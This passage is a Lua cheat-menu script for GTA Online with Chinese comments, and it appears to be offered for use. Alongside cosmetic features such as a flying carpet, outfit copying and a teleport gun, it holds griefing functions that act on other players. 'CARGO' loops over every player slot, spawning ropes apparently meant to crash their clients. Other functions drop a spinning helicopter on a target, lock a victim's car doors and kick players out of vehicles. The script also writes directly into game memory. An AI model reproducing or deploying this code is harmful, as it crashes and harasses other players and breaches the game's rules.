			ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnweapon, plyped(), PED.GET_PED_BONE_INDEX(plyped(), 0x192A), 0, 0, 0.13, 0, 90, 270, false, true, false, false, 1, true, 0)
		end
	end
	if (WEAPON.GET_WEAPONTYPE_GROUP(HUD1._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped())) == 1548507267) or (WEAPON.GET_WEAPONTYPE_GROUP(HUD1._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped())) == -37788308) or (WEAPON.GET_WEAPONTYPE_GROUP(HUD1._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped())) == 1595662460) then	
		if (HUD1._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_petrolcan")) or (HUD1._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_hazardcan")) or (HUD1._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_fertilizercan")) then
			ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnweapon, plyped(), PED.GET_PED_BONE_INDEX(plyped(), 0x60F2), 0, -0.18, -0, 0, 90, 0, false, true, false, false, 1, true, 0)
		end
		if (HUD1._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_proxmine")) or (HUD1._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_stickybomb")) then
			ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnweapon, plyped(), PED.GET_PED_BONE_INDEX(plyped(), 0x192A), 0.2, 0, 0.13, 0, 0, 270, false, true, false, false, 1, true, 0)
		end
		if (HUD1._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_fireextinguisher")) then
			ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnweapon, plyped(), PED.GET_PED_BONE_INDEX(plyped(), 0x192A), 0, -0.05, 0.13, 0, 270, 90, false, true, false, false, 1, true, 0)
		end
		if not (HUD1._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_petrolcan")) and not (HUD1._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_hazardcan")) and not (HUD1._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_fertilizercan")) and not (HUD1._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_proxmine")) and not (HUD1._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_stickybomb")) and not (HUD1._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_fireextinguisher")) then
			ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnweapon, plyped(), PED.GET_PED_BONE_INDEX(plyped(), 0x192A), 0.2, 0, 0.13, 0, 270, 270, false, true, false, false, 1, true, 0)
		end
	end
	if not (WEAPON.GET_WEAPONTYPE_GROUP(HUD1._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped())) == 416676503) and not (WEAPON.GET_WEAPONTYPE_GROUP(HUD1._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped())) == 690389602) and not (WEAPON.GET_WEAPONTYPE_GROUP(HUD1._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped())) == -728555052) and not (WEAPON.GET_WEAPONTYPE_GROUP(HUD1._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped())) == -1609580060) and not (WEAPON.GET_WEAPONTYPE_GROUP(HUD1._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped())) == 1548507267) and not (WEAPON.GET_WEAPONTYPE_GROUP(HUD1._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped())) == -37788308) and not (WEAPON.GET_WEAPONTYPE_GROUP(HUD1._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped())) == 1595662460) then
		ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnweapon, plyped(), PED.GET_PED_BONE_INDEX(plyped(), 0x60F2), 0, -0.18, 0, 180, 220, 0, false, true, false, false, 1, true, 0)
	end
end
function plyped()
	return PLAYER.PLAYER_PED_ID()
end


----附加恶搞模型
function Attachd_Self(index)
    local hash = spoof_attachd.value[index]
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), false)
    local obj = create_object(hash, pos.x, pos.y, pos.z)
    ENTITY.SET_ENTITY_HEADING(obj,ENTITY.GET_ENTITY_HEADING(PLAYER.PLAYER_PED_ID()))
    ENTITY.ATTACH_ENTITY_TO_ENTITY(obj, PLAYER.PLAYER_PED_ID(), 0, 0, 0, 0, 0, 0, 0, true, false, false, true, 0, true, 0)
end


------地毯飞行
function carpetride(toggled)
    carpetride_toggled = toggled
    if carpetride_toggled then
        local objHash = util.joaat("p_cs_beachtowel_01_s")
        request_model(objHash)
        request_anim_dict("rcmcollect_paperleadinout@")
        local localPed = PLAYER.PLAYER_PED_ID()
        local pos = ENTITY.GET_ENTITY_COORDS(localPed, false)
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(localPed)
        carpet_object = entities.create_object(objHash, pos)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(localPed, carpet_object, 0, 0, -0.2, 1.0, 1.0, 1.0,1, false, true, false, false, 0, true, 0)
        ENTITY.SET_ENTITY_COMPLETELY_DISABLE_COLLISION(carpet_object, false, false)
        TASK.TASK_PLAY_ANIM(localPed, "rcmcollect_paperleadinout@", "meditiate_idle", 8.0, -8.0, -1, 1, 0.0, false, false, false)
    end
    while carpetride_toggled do
        local objPos = ENTITY.GET_ENTITY_COORDS(carpet_object, false)
        local camrot = CAM.GET_GAMEPLAY_CAM_ROT(0)
        ENTITY.SET_ENTITY_ROTATION(carpet_object, 0, 0, camrot.z, 0, true)
        local forwardV = ENTITY.GET_ENTITY_FORWARD_VECTOR(PLAYER.PLAYER_PED_ID())
        forwardV.z = 0.0
        local delta = v3.new(0, 0, 0)
        local speed = 0.2
        if PAD.IS_CONTROL_PRESSED(0, 61) then
            speed = 1.5
        end
        if PAD.IS_CONTROL_PRESSED(0, 32) then
            delta = v3.new(forwardV)
            delta:mul(speed)
        end
        if PAD.IS_CONTROL_PRESSED(0, 130)  then
            delta = v3.new(forwardV)
            delta:mul(-speed)
        end
        if PAD.IS_DISABLED_CONTROL_PRESSED(0, 22) then
            delta.z = speed
        end
        if PAD.IS_CONTROL_PRESSED(0, 36) then
            delta.z = -speed
        end
        local newPos = v3.new(objPos)
        newPos:add(delta)
        ENTITY.SET_ENTITY_COORDS(carpet_object, newPos.x,newPos.y,newPos.z, false, false, false, false)
        util.yield()
    end
    TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.PLAYER_PED_ID())
    ENTITY.DETACH_ENTITY(PLAYER.PLAYER_PED_ID(), true, false)
    delete_entity(carpet_object)
end





-----CARGO崩溃
function CARGO()
    for pid = 0, 31 do
        local cspped = PLAYER.GET_PLAYER_PED(pid)
        local TPpos = ENTITY.GET_ENTITY_COORDS(cspped, true)
        local cargobob = create_vehicle(0XFCFCB68B, TPpos.x, TPpos.y, TPpos.z, ENTITY.GET_ENTITY_HEADING(PLAYER.PLAYER_PED_ID()))
        ENTITY.SET_ENTITY_INVINCIBLE(cargobob, true)
        local cargobobPos = ENTITY.GET_ENTITY_COORDS(cargobob, true)
        local veh = create_vehicle(0X187D938D, TPpos.x, TPpos.y, TPpos.z, ENTITY.GET_ENTITY_HEADING(PLAYER.PLAYER_PED_ID()))
        ENTITY.SET_ENTITY_INVINCIBLE(veh, true)
        local vehPos = ENTITY.GET_ENTITY_COORDS(veh, true)
        local newRope = PHYSICS.ADD_ROPE(TPpos.x, TPpos.y, TPpos.z, 0, 0, 10, 1, 1, 0.00300000000000000000000000000000000000000000000001, 1, 1, false, false, false, 1.0, false, 0)
        PHYSICS.ATTACH_ENTITIES_TO_ROPE(newRope, cargobob, veh, cargobobPos.x, cargobobPos.y, cargobobPos.z, vehPos.x, vehPos.y, vehPos.z, 2, false, false, 0, 0, "Center", "Center")
        util.yield(2500)
        delete_entity(cargobob)
        delete_entity(veh)
        PHYSICS.DELETE_CHILD_ROPE(newRope)
    end
end


--------磁力枪
function draw_marker(type, pos, scale, colourd, textureDict, textureName)
	textureDict = textureDict
	textureName = textureName or 0
	GRAPHICS.DRAW_MARKER(
		type,
		pos.x, pos.y, pos.z,
		0.0, 0.0, 0.0,
		0.0, 0.0, 0.0,
		scale, scale, scale,
		colourd.r, colourd.g, colourd.b, colourd.a,
		false, false, 0, true, textureDict, textureName, false
	)
end
function rainbow_colour1(colourd)
	if colourd.r > 0 and colourd.b == 0 then
		colourd.r = colourd.r - 1
		colourd.g = colourd.g + 1
	end

	if colourd.g > 0 and colourd.r == 0 then
		colourd.g = colourd.g - 1
		colourd.b = colourd.b + 1
	end

	if colourd.b > 0 and colourd.g == 0 then
		colourd.r = colourd.r + 1
		colourd.b = colourd.b - 1
	end
end
local magselectedOpt = 1
local magncolour = {r = 0, g = 255, b = 255, a = 255}
function ciliqiang()
    if PLAYER.IS_PLAYER_FREE_AIMING(PLAYER.PLAYER_ID()) then
        local offset = get_offset_from_camera(30.0)
        rainbow_colour1(magncolour)
        draw_marker(28, offset, 0.4, magncolour)

        for _, vehicle in ipairs(entities.get_all_vehicles_as_handles()) do
            if PED.GET_VEHICLE_PED_IS_USING(PLAYER.PLAYER_PED_ID()) ~= vehicle then
                request_control(vehicle, 0)--防止长时间请求
                local vehiclePos = ENTITY.GET_ENTITY_COORDS(vehicle, false)
                local vect = v3.new(offset)
                vect:sub(vehiclePos)
                if magselectedOpt == 1 then
                    ENTITY.SET_ENTITY_VELOCITY(vehicle, vect.x,vect.y,vect.z)

                elseif magselectedOpt == 2 then
                    vect:mul(0.5)
                    ENTITY.APPLY_FORCE_TO_ENTITY(vehicle, 1, vect.x,vect.y,vect.z, 0.0, 0.0, 0.5, 0, false, false, true, false, false)
                end
            end
        end
    end
end
function szclq(index, menu_name, prev_value, click_type)
    magselectedOpt = index
end






------空袭枪
function kxq()
    local hash = util.joaat("weapon_airstrike_rocket")
	request_weapon_asset(hash)
	local raycastResult = get_raycast_result(1000.0)
	if raycastResult.didHit and PED.IS_PED_SHOOTING(PLAYER.PLAYER_PED_ID()) then
		local pos = raycastResult.endCoords
		MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(
			pos.x, pos.y, pos.z + 35.0,
			pos.x, pos.y, pos.z,
			200,
			true,
			hash,
			PLAYER.PLAYER_PED_ID(), true, false, 2500.0
		)
	end
end


-----传送枪
local function write_vector3(address, vector)
	memory.write_float(address + 0x0, vector.x)
	memory.write_float(address + 0x4, vector.y)
	memory.write_float(address + 0x8, vector.z)
end
local function set_entity_coords(entity, coords)
	local fwEntity = entities.handle_to_pointer(entity)
	local CNavigation = memory.read_long(fwEntity + 0x30)
	if CNavigation ~= 0 then
		write_vector3(CNavigation + 0x50, coords)
		write_vector3(fwEntity + 0x90, coords)
	end
end
function csq()
    local raycastResult = get_raycast_result(1000.0)
	if  raycastResult.didHit and PED.IS_PED_SHOOTING(PLAYER.PLAYER_PED_ID()) then
		local coords = raycastResult.endCoords
		if not PED.IS_PED_IN_ANY_VEHICLE(PLAYER.PLAYER_PED_ID(), false) then
			coords.z = coords.z + 1.0
			set_entity_coords(PLAYER.PLAYER_PED_ID(), coords)
		else
			local vehicle = PED.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(), false)
			local speed = ENTITY.GET_ENTITY_SPEED(vehicle)
			ENTITY.SET_ENTITY_COORDS(vehicle, coords.x, coords.y, coords.z, false, false, false, false)
			ENTITY.SET_ENTITY_HEADING(vehicle, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
			VEHICLE.SET_VEHICLE_FORWARD_SPEED(vehicle, speed + 3.0)
		end
	end
end

----偷车枪
function steal_car_gun()
    if PED.IS_PED_SHOOTING(PLAYER.PLAYER_PED_ID()) then
        local ent = get_entity_player_is_aiming_at(PLAYER.PLAYER_ID())
        if ENTITY.IS_ENTITY_A_VEHICLE(ent) then
            local driver = VEHICLE.GET_PED_IN_VEHICLE_SEAT(ent, -1)
            if PED.IS_PED_A_PLAYER(driver) then
                local pid = NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(driver)
                menu.trigger_commands("vehkick".. players.get_name(pid))
            elseif ENTITY.DOES_ENTITY_EXIST(driver) and not PED.IS_PED_A_PLAYER(driver) then
                request_control(driver)
                delete_entity(driver)
            end
            PED.SET_PED_INTO_VEHICLE(PLAYER.PLAYER_PED_ID(), ent, -1)
        end
    end
end


------翻滚换弹
function fghd()
    if TASK.GET_IS_TASK_ACTIVE(PLAYER.PLAYER_PED_ID(), 4) and PAD.IS_CONTROL_PRESSED(2, 22) and not PED.IS_PED_SHOOTING(PLAYER.PLAYER_PED_ID()) then
        util.yield(900)
        WEAPON.REFILL_AMMO_INSTANTLY(PLAYER.PLAYER_PED_ID())
    end
end


----手指枪
function shouzhiqiang()
    for id, data in pairs(weapon_stuff) do
        menu.toggle_loop(finger_thing, data[1], {}, "", function()
            local hash = util.joaat(data[2])
            request_weapon_asset(hash)
            if is_player_pointing() then
                memory.write_int(memory.script_global(4521801 + 937), NETWORK.GET_NETWORK_TIME()) --禁止动作结束
                local inst = v3.new()
                local final_rot = CAM.GET_FINAL_RENDERED_CAM_ROT(2)
                v3.set(inst, final_rot.x,final_rot.y,final_rot.z)
                local tmp = v3.toDir(inst)
                v3.set(inst, v3.get(tmp))
                v3.mul(inst, 1000)
                local final_coord = CAM.GET_FINAL_RENDERED_CAM_COORD()
                v3.set(tmp, final_coord.x,final_coord.y,final_coord.z)
                v3.add(inst, tmp)
                local x, y, z = v3.get(inst)
                local fingerPos = PED.GET_PED_BONE_COORDS(PLAYER.PLAYER_PED_ID(), 0xff9, 1.0, 0, 0)
                MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY(fingerPos.x, fingerPos.y, fingerPos.z, x, y, z, 1, true, hash, 0, true, false, 500.0, PLAYER.PLAYER_PED_ID(), 0)
            end
            util.yield(100)
        end)
    end
end


----绘制函数
--光线投影
function get_raycast_result(dist, flag)
	local result = {}
	flag = flag or TraceFlag.everything
	local didHit = memory.alloc(1)
	local endCoords = v3.new()
	local normal = v3.new()
	local hitEntity = memory.alloc_int()
	local camPos = CAM.GET_FINAL_RENDERED_CAM_COORD()
	local offset = get_offset_from_camera(dist)
	local handle = SHAPETEST.START_EXPENSIVE_SYNCHRONOUS_SHAPE_TEST_LOS_PROBE(
		camPos.x, camPos.y, camPos.z,
		offset.x, offset.y, offset.z,
		flag,
		PLAYER.PLAYER_PED_ID(), 7
	)
	SHAPETEST.GET_SHAPE_TEST_RESULT(handle, didHit, endCoords, normal, hitEntity)
	result.didHit = memory.read_byte(didHit) ~= 0
	result.endCoords = endCoords
	result.surfaceNormal = normal
	result.hitEntity = memory.read_int(hitEntity)
	return result
end
function draw_line(start, to, colourd)
	GRAPHICS.DRAW_LINE(start.x,start.y,start.z, to.x,to.y,to.z, colourd.r, colourd.g, colourd.b, colourd.a)
end
function draw_rect(pos0, pos1, pos2, pos3, colourd)
	GRAPHICS.DRAW_POLY(pos0.x, pos0.y, pos0.z, pos1.x, pos1.y, pos1.z, pos3.x, pos3.y, pos3.z, colourd.r, colourd.g, colourd.b, colourd.a)
	GRAPHICS.DRAW_POLY(pos3.x, pos3.y, pos3.z, pos2.x, pos2.y, pos2.z, pos0.x, pos0.y, pos0.z, colourd.r, colourd.g, colourd.b, colourd.a)
end
function draw_bounding_box(entity, showPoly, colourd)
	if not ENTITY.DOES_ENTITY_EXIST(entity) then
		return
	end
	colourd = colourd or {r = 255, g = 0, b = 0, a = 255}
	local min = v3.new()
	local max = v3.new()
	MISC.GET_MODEL_DIMENSIONS(ENTITY.GET_ENTITY_MODEL(entity), min, max)
	min:abs(); max:abs()
	local upperLeftRear = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(entity, -max.x, -max.y, max.z)
	local upperRightRear = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(entity, min.x, -max.y, max.z)
	local lowerLeftRear = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(entity, -max.x, -max.y, -min.z)
	local lowerRightRear = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(entity, min.x, -max.y, -min.z)
	draw_line(upperLeftRear, upperRightRear, colourd)
	draw_line(lowerLeftRear, lowerRightRear, colourd)
	draw_line(upperLeftRear, lowerLeftRear, colourd)
	draw_line(upperRightRear, lowerRightRear, colourd)
	local upperLeftFront = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(entity, -max.x, min.y, max.z)
	local upperRightFront = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(entity, min.x, min.y, max.z)
	local lowerLeftFront = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(entity, -max.x, min.y, -min.z)
	local lowerRightFront = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(entity, min.x, min.y, -min.z)
	draw_line(upperLeftFront, upperRightFront, colourd)
	draw_line(lowerLeftFront, lowerRightFront, colourd)
	draw_line(upperLeftFront, lowerLeftFront, colourd)
	draw_line(upperRightFront, lowerRightFront, colourd)
	draw_line(upperLeftRear, upperLeftFront, colourd)
	draw_line(upperRightRear, upperRightFront, colourd)
	draw_line(lowerLeftRear, lowerLeftFront, colourd)
	draw_line(lowerRightRear, lowerRightFront, colourd)
	if type(showPoly) ~= "boolean" or showPoly then
		draw_rect(lowerLeftRear, upperLeftRear, lowerLeftFront, upperLeftFront, colourd)
		draw_rect(upperRightRear, lowerRightRear, upperRightFront, lowerRightFront, colourd)
		draw_rect(lowerLeftFront, upperLeftFront, lowerRightFront, upperRightFront, colourd)
		draw_rect(upperLeftRear, lowerLeftRear, upperRightRear, lowerRightRear, colourd)
		draw_rect(upperRightRear, upperRightFront, upperLeftRear, upperLeftFront, colourd)
		draw_rect(lowerRightFront, lowerRightRear, lowerLeftFront, lowerLeftRear, colourd)
	end
end


--判断是否指向
function is_player_pointing() ----Update tag(1.69)
    --freemode.c [//STREAMING::REQUEST_ANIM_DICT("anim@mp_point")]
    return memory.read_int(memory.script_global(4521801 + 932--[[ +2 ]])) == 3
end


----神指
local targetEntity = NULL
local explosionProof = false
function godfinger()
    --准星
    HUD.DISPLAY_SNIPER_SCOPE_THIS_FRAME()
    if is_player_pointing() then
        memory.write_int(memory.script_global(4521801 + 937--[[ +2 ]]), NETWORK.GET_NETWORK_TIME()) --禁止动作结束
		if not ENTITY.DOES_ENTITY_EXIST(targetEntity) then
			local flag = TraceFlag.peds | TraceFlag.vehicles | TraceFlag.pedsSimpleCollision | TraceFlag.objects
			local raycastResult = get_raycast_result(500.0, flag)
			if raycastResult.didHit and ENTITY.DOES_ENTITY_EXIST(raycastResult.hitEntity) then
				targetEntity = raycastResult.hitEntity
			end
		else

			local myPos = players.get_position(PLAYER.PLAYER_ID())
			local entityPos = ENTITY.GET_ENTITY_COORDS(targetEntity, true)
			local camDir = CAM.GET_GAMEPLAY_CAM_ROT(0):toDir()
			local distance = myPos:distance(entityPos)
			if distance > 30.0 then distance = 30.0
			elseif distance < 10.0 then distance = 10.0 end
			local targetPos = v3.new(camDir)
			targetPos:mul(distance)
			targetPos:add(myPos)
			local direction = v3.new(targetPos)
			direction:sub(entityPos)
			direction:normalise()
			if ENTITY.IS_ENTITY_A_PED(targetEntity) then
				direction:mul(5.0)
				local explosionPos = v3.new(entityPos)
				explosionPos:sub(direction)
				draw_bounding_box(targetEntity, false, {r = 255, g = 255, b = 255, a = 255})
				set_explosion_proof(PLAYER.PLAYER_PED_ID(), true)
				explosionProof = true
				FIRE.ADD_EXPLOSION(explosionPos.x, explosionPos.y, explosionPos.z, 29, 25.0, false, true, 0.0, true)
			else
				local vel = v3.new(direction)
				local magnitude = entityPos:distance(targetPos)
				vel:mul(magnitude)
				draw_bounding_box(targetEntity, true, {r = 255, g = 255, b = 255, a = 80})
				request_control(targetEntity)
				ENTITY.SET_ENTITY_VELOCITY(targetEntity, vel.x, vel.y, vel.z)
			end
		end
	elseif targetEntity ~= NULL then
		timer.reset()
		targetEntity = NULL
	elseif explosionProof and timer.elapsed() > 500 then
		explosionProof = false
		set_explosion_proof(PLAYER.PLAYER_PED_ID(), false)
    end
end



----切碎
function Finely_chopped(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local target_ped = PLAYER.GET_PLAYER_PED(pid)
    local coords = ENTITY.GET_ENTITY_COORDS(target_ped, false)
    coords.z = coords['z']+2.5
    local hash = util.joaat("buzzard")
    request_model(hash)
    local heli = entities.create_vehicle(hash, coords, ENTITY.GET_ENTITY_HEADING(target_ped))
    VEHICLE.SET_VEHICLE_ENGINE_ON(heli, true, true, false)
    VEHICLE.SET_HELI_BLADES_FULL_SPEED(heli)
    ENTITY.SET_ENTITY_INVINCIBLE(heli, true)
    ENTITY.FREEZE_ENTITY_POSITION(heli, true)
    ENTITY.SET_ENTITY_COMPLETELY_DISABLE_COLLISION(heli, true, true)
    ENTITY.SET_ENTITY_ROTATION(heli, 180, 0.0, ENTITY.GET_ENTITY_HEADING(target_ped), 1, true)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(heli, coords.x, coords.y, coords.z, true, false, false)
    VEHICLE.SET_VEHICLE_ENGINE_ON(heli, true, true, true)
    util.yield(3000)
    delete_entity(heli)
end


----儿童锁
function Child_Lock(on,pid)
    usingChildLock = on
    if not usingChildLock then return end
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    while usingChildLock and NETWORK.NETWORK_IS_PLAYER_ACTIVE(pid) and not util.is_session_transition_active() do
        local vehicle = get_vehicle_player_is_in(pid)
        if ENTITY.DOES_ENTITY_EXIST(vehicle) and request_control(vehicle, 3) then
            VEHICLE.SET_VEHICLE_DOORS_LOCKED(vehicle, 4)
        end
        util.yield_once()
    end
    local vehicle = get_vehicle_player_is_in(pid)
    if ENTITY.DOES_ENTITY_EXIST(vehicle) and request_control(vehicle, 3) then
        VEHICLE.SET_VEHICLE_DOORS_LOCKED(vehicle, 1)
    end
end

----蹦床
function trampoline()
    if PED.IS_PED_IN_ANY_VEHICLE(PLAYER.PLAYER_PED_ID(), false) then
        if ENTITY.IS_ENTITY_IN_WATER(entities.get_user_vehicle_as_handle(false)) then
            local vel = v3.new(ENTITY.GET_ENTITY_VELOCITY(entities.get_user_vehicle_as_handle(false)))
            ENTITY.SET_ENTITY_VELOCITY(entities.get_user_vehicle_as_handle(false), vel.x, vel.y, 15)
        end
    else
        if ENTITY.IS_ENTITY_IN_WATER(PLAYER.PLAYER_PED_ID()) then
            local vel = v3.new(ENTITY.GET_ENTITY_VELOCITY(entities.get_user_vehicle_as_handle(false)))
            ENTITY.SET_ENTITY_VELOCITY(PLAYER.PLAYER_PED_ID(), vel.x, vel.y, 15)
        end
    end
end

----火箭人
function Rocket_Man()
    PED.SET_PED_TO_RAGDOLL(PLAYER.PLAYER_PED_ID(), 2500, 0, 0, false, false, false)
    local forces = {10, 15, 20, 20, 20, 10, 10, 10, 10, 10, 10}
    local delays = {1000, 900, 800, 700, 600, 500, 400, 300, 200, 175, 125}
    for i = 1, #forces do
        ENTITY.APPLY_FORCE_TO_ENTITY(PLAYER.PLAYER_PED_ID(), 3, 0.0, 0.0, forces[i], 0.0, 0.0, 0.0, 0, false, false, true, false, false)
        local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
        request_ptfx_asset("cut_xm3")
        GRAPHICS.USE_PARTICLE_FX_ASSET("cut_xm3")
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD("cut_xm3_rpg_explosion", pos.x, pos.y, pos.z-0.5, 0, 0, 0, 1.0, true, true, true)
        AUDIO.PLAY_SOUND_FROM_ENTITY(-1, "Bomb_Countdown_Beep", PLAYER.PLAYER_PED_ID(), "DLC_MPSUM2_ULP2_Rogue_Drones", true, 0)
        util.yield(delays[i])
    end
    for i = 1, 2 do
        local delay = util.current_time_millis() + 500
        repeat
            ENTITY.APPLY_FORCE_TO_ENTITY(PLAYER.PLAYER_PED_ID(), 3, 0.0, 0.0, 10, 0.0, 0.0, 0.0, 0, false, false, true, false, false)
            pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
            request_ptfx_asset("cut_xm3")
            GRAPHICS.USE_PARTICLE_FX_ASSET("cut_xm3")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD("cut_xm3_rpg_explosion", pos.x, pos.y, pos.z-0.5, 0, 0, 0, 1.0, true, true, true)
            AUDIO.PLAY_SOUND_FROM_ENTITY(-1, "Bomb_Countdown_Beep", PLAYER.PLAYER_PED_ID(), "DLC_MPSUM2_ULP2_Rogue_Drones", true, 0)
            util.yield(i == 1 and 100 or 10)
        until delay <= util.current_time_millis()
    end
    AUDIO.PLAY_SOUND_FROM_ENTITY(-1, "Bomb_Detonate", PLAYER.PLAYER_PED_ID(), "DLC_MPSUM2_ULP2_Rogue_Drones", true, 0)
    pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
    request_ptfx_asset("scr_xm_orbital")
    GRAPHICS.USE_PARTICLE_FX_ASSET("scr_xm_orbital")
    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD("scr_xm_orbital_blast", pos.x, pos.y, pos.z, 0, 180, 0, 1.0, true, true, true)
    STREAMING.REMOVE_NAMED_PTFX_ASSET("cut_xm3")
    STREAMING.REMOVE_NAMED_PTFX_ASSET("scr_xm_orbital")
end



----第二部分

----复制服饰
function get_outfit(ped)
    local outfit = {components = {}, props = {}}
    for i = 0, 11 do
        outfit.components[i] = {
            PED.GET_PED_DRAWABLE_VARIATION(ped, i), 
            PED.GET_PED_TEXTURE_VARIATION(ped, i)
        }
    end
    for i = 0, 9 do
        outfit.props[i] = {
            PED.GET_PED_PROP_INDEX(ped, i),
            PED.GET_PED_PROP_TEXTURE_INDEX(ped, i)
        }
    end
    return outfit
end
function apply_outfit(components, props)
    for k, v in pairs(components) do
        PED.SET_PED_COMPONENT_VARIATION(PLAYER.PLAYER_PED_ID(), tonumber(k), v[1], v[2], 0)
    end
    for k, v in pairs(props) do
        if v[1] == -1 then
            PED.CLEAR_PED_PROP(PLAYER.PLAYER_PED_ID(), tonumber(k))
        else
            PED.SET_PED_PROP_INDEX(PLAYER.PLAYER_PED_ID(), tonumber(k), v[1], v[2], true)
        end
    end
end
function copy_outfit(pid)
    if NETWORK.NETWORK_IS_PLAYER_CONNECTED(pid) == 0 then return end
    local ped = PLAYER.GET_PLAYER_PED(pid)
    local model = ENTITY.GET_ENTITY_MODEL(ped)
    local outfit = get_outfit(ped)
    if model ~= ENTITY.GET_ENTITY_MODEL(PLAYER.PLAYER_PED_ID()) then
        change_model(PLAYER.PLAYER_ID(), model)
        PED1._SET_PED_EYE_COLOR(PLAYER.PLAYER_ID(), PED1._GET_PED_EYE_COLOR(ped))
        for i = 0, 12 do
            PED.SET_PED_HEAD_OVERLAY(PLAYER.PLAYER_PED_ID(), i, PED1._GET_PED_HEAD_OVERLAY_VALUE(ped, i), 0)
        end
        apply_outfit(outfit.components, outfit.props)
    else
        apply_outfit(outfit.components, outfit.props)
    end
end

----复制载具
function get_vehicle_info(vehicle)
    local outTable = {}
    outTable['hash'] = ENTITY.GET_ENTITY_MODEL(vehicle)
    outTable['wheelType'] = VEHICLE.GET_VEHICLE_WHEEL_TYPE(vehicle)
    outTable['mods'] = {}
    for i = 0, 49 do
        outTable['mods'][i] = VEHICLE.GET_VEHICLE_MOD(vehicle, i)
    end
    outTable['tyresCanBurst'] = VEHICLE.GET_VEHICLE_TYRES_CAN_BURST(vehicle) == 1
    local pR, pG, pB = memory.alloc(4), memory.alloc(4), memory.alloc(4)
    VEHICLE.GET_VEHICLE_CUSTOM_PRIMARY_COLOUR(vehicle, pR, pG, pB)
    outTable['colors'] = {}
    outTable['colors']['prim'] = {
        ['r'] = memory.read_int(pR),
        ['g'] = memory.read_int(pG),
        ['b'] = memory.read_int(pB)
    }
    VEHICLE.GET_VEHICLE_CUSTOM_SECONDARY_COLOUR(vehicle, pR, pG, pB)
    outTable['colors']['sec'] = {
        ['r'] = memory.read_int(pR),
        ['g'] = memory.read_int(pG),
        ['b'] = memory.read_int(pB)
    }
    VEHICLE.GET_VEHICLE_EXTRA_COLOURS(vehicle, pR, pG)
    outTable['extraColors'] = {
        ['pearl'] = memory.read_int(pR),
        ['wheels'] = memory.read_int(pG)
    }
    outTable['livery'] = VEHICLE.GET_VEHICLE_LIVERY(vehicle)
    outTable['plateText'] = VEHICLE.GET_VEHICLE_NUMBER_PLATE_TEXT(vehicle)
    outTable['plateType'] = VEHICLE.GET_VEHICLE_PLATE_TYPE(vehicle)
    outTable['roofState'] = VEHICLE.GET_CONVERTIBLE_ROOF_STATE(vehicle)
    outTable['neonColors'] = {}
    outTable['neonColors']['red'], outTable['neonColors']['green'], outTable['neonColors']['blue'] = memory.read_int(pR), memory.read_int(pG), memory.read_int(pB)
    VEHICLE.GET_VEHICLE_TYRE_SMOKE_COLOR(vehicle, pR, pG, pB)
    outTable['tyreSmoke'] = {}
